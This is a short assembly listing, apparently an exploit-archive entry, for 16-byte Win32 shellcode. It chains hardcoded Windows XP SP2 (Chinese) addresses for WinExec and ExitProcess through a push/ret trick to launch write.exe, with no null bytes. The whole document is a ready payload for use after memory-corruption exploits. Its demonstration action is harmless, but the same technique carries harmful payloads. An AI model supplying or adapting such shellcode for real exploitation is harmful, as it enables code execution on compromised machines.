# Title: Win32 Mini HardCode WinExec&ExitProcess Shellcode 16 bytes
;Test on xpsp2cn,no zero in shellcode,it will run write.exe()
;---------------------------------------------
push 7C808E9DH ;write ;68 xx xx xx xx ;program string in memory
push 7C81CAA2H ;exitprocess ;68 xx xx xx xx
push 7C86114DH ;winexec ;68 xx xx xx xx
ret ;C3
;--------------------------------------------